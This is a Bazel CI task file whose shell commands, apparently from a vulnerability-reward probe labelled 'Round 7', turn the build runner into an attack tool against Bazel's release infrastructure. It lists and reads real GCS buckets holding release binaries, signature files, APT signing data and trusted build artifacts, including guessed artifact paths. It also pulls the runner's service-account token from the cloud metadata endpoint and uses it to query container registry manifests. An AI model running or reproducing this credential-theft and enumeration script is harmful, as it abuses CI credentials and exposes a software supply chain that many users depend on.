---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 7: Release Signing and GCR ==="
      - "echo"
      - "echo === 1. List release dir gs://bazel/9.1.0/release/ ==="
      - "gsutil ls -rl gs://bazel/9.1.0/release/ 2>&1 || true"
      - "echo"
      - "echo === 2. List release dir gs://bazel/8.7.0/release/ ==="
      - "gsutil ls -rl gs://bazel/8.7.0/release/ 2>&1 || true"
      - "echo"
      - "echo === 3. List latest rolling release ==="
      - "gsutil ls -rl gs://bazel/10.0.0/rolling/ 2>&1 | head -50 || true"
      - "echo"
      - "echo === 4. Download release sha256 file ==="
      - "gsutil cat gs://bazel/9.1.0/release/bazel-9.1.0-linux-x86_64.sha256 2>&1 || true"
      - "echo"
      - "echo === 5. Download release sig file ==="
      - "gsutil cat gs://bazel/9.1.0/release/bazel-9.1.0-linux-x86_64.sig 2>&1 | xxd | head -20 || true"
      - "echo"
      - "echo === 6. APT Release.gpg signing ==="
      - "gsutil cat gs://bazel-apt/dists/stable/Release.gpg 2>&1 | head -30 || true"
      - "echo"
      - "echo === 7. APT InRelease (signed) ==="
      - "gsutil cat gs://bazel-apt/dists/stable/InRelease 2>&1 | head -50 || true"
      - "echo"
      - "echo === 8. APT pool — list .deb packages ==="
      - "gsutil ls -rl gs://bazel-apt/pool/jdk1.8/ 2>&1 | tail -30 || true"
      - "echo"
      - "echo === 9. APT testing dist ==="
      - "gsutil cat gs://bazel-apt/dists/testing/Release 2>&1 || true"
      - "echo"
      - "echo === 10. GCR centos7-releaser tags ==="
      - "T=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')"
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/centos7-releaser/tags/list' 2>&1 | python3 -m json.tool 2>&1 | head -60 || true"
      - "echo"
      - "echo === 11. GCR rockylinux8-releaser tags ==="
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/rockylinux8-releaser/tags/list' 2>&1 | python3 -m json.tool 2>&1 | head -60 || true"
      - "echo"
      - "echo === 12. GCR bazel image tags ==="
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/bazel/tags/list' 2>&1 | python3 -m json.tool 2>&1 | head -60 || true"
      - "echo"
      - "echo === 13. Stat release binary for metadata ==="
      - "gsutil stat gs://bazel/8.7.0/release/bazel-8.7.0-linux-x86_64 2>&1 || true"
      - "echo"
      - "echo === 14. List older trusted artifacts for non-binary content ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/00022b33-975d-45c2-9330-b5ff16934460/ 2>&1 || true"
      - "echo"
      - "echo === 15. Another older trusted artifact ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/0000698e-6969-401a-ac6e-9e1112f44131/ 2>&1 || true"
      - "echo"
      - "echo === 16. Random mid-range trusted artifact ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/88888888-0000-0000-0000-000000000000/ 2>&1 || true"
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/aaaa0000-0000-0000-0000-000000000000/ 2>&1 || true"
      - "echo"
      - "echo === 17. Count total trusted artifacts ==="
      - "gsutil ls gs://bazel-trusted-buildkite-artifacts/ 2>&1 | wc -l || true"
      - "echo"
      - "echo === 18. List gs://bazel-mirror/bazel_java_tools/ ==="
      - "gsutil ls -rl gs://bazel-mirror/bazel_java_tools/ 2>&1 | head -30 || true"
      - "echo"
      - "echo === 19. List gs://bazel-mirror/bazel_coverage_output_generator/ ==="
      - "gsutil ls -rl gs://bazel-mirror/bazel_coverage_output_generator/ 2>&1 | head -20 || true"
      - "echo"
      - "echo === 20. Check if we can read GCR image layers ==="
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/centos7-releaser/manifests/latest' 2>&1 | python3 -c 'import json,sys; d=json.load(sys.stdin); print(json.dumps(d, indent=2))' 2>&1 | head -40 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
